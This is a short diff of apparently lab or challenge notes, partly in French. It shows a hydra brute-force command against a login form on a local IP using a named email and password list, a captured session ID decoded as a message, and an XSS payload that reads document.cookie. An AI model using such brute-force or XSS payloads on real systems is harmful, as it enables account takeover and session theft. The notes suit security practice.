@@ -4,10 +4,9 @@ hydra -s 80 -l marc.martin@gmail.com -P ../marc.txt http-post-form://192.168.0.2
 
 
 
-
-
-
 (il y a une erreur dans votre form je crois il redirige sur /session1.php alors qu'il devrait rediriger sur => session.php)
 PHPSESSID=c3c1e5tun1dd3s3s51on
+
+cEcIeStunIddEsEsSIon => CECI ES UN ID DE SESSION
 
 <img src="ded" onerror="alert(document.cookie);">
